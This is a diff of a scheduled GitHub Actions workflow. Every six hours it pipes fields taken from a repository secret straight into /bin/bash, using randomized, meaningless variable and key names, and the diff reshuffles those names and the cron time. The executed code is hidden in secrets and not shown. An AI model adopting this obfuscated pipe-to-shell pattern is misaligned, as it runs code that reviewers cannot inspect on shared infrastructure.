@@ -1,26 +1,30 @@
 name: xinglianjiqian
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 4/6 * * *'
+    - cron: '57 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xinglianjiqian
         env:
-          zjsi668: ${{ secrets.zjsi668 }}
+          hut12: ${{ secrets.hut12 }}
         run: |
-          echo $zjsi668 | jq -r .velu8460 | /bin/bash
-          echo $kt0 | jq -r .y851 | /bin/bash
-          echo $j471 | jq -r .itnfc86238 | /bin/bash
-          echo $b332 | jq -r .k1 | /bin/bash
-          echo $ehg78 | jq -r .lu65206 | /bin/bash
-          echo $wn41 | jq -r .rh58932 | /bin/bash
-          echo $rexf74592 | jq -r .flnqi97556 | /bin/bash
-          echo $lhyi4 | jq -r .oj14473 | /bin/bash
-          echo $rd307 | jq -r .zcc103 | /bin/bash
-          echo $yiw02928 | jq -r .pusgk41116 | /bin/bash
+          echo $hut12 | jq -r .van70884 | /bin/bash
+          echo $lhpky200 | jq -r .wz0814 | /bin/bash
+          echo $kxy1 | jq -r .eiwu8 | /bin/bash
+          echo $vnhap2 | jq -r .qjbk43340 | /bin/bash
+          echo $xojr1612 | jq -r .ef4193 | /bin/bash
+          echo $we691 | jq -r .uqe80781 | /bin/bash
+          echo $kja681 | jq -r .w3 | /bin/bash
+          echo $iqjn922 | jq -r .d1200 | /bin/bash
+          echo $iypmo6727 | jq -r .stq8 | /bin/bash
+          echo $djp67 | jq -r .jwur15 | /bin/bash
+          echo $r3 | jq -r .qoa3824 | /bin/bash
+          echo $n23 | jq -r .vlu56113 | /bin/bash
+          echo $zdzje930 | jq -r .nt4549 | /bin/bash
+          echo $ksgt4 | jq -r .hotzx122 | /bin/bash
 
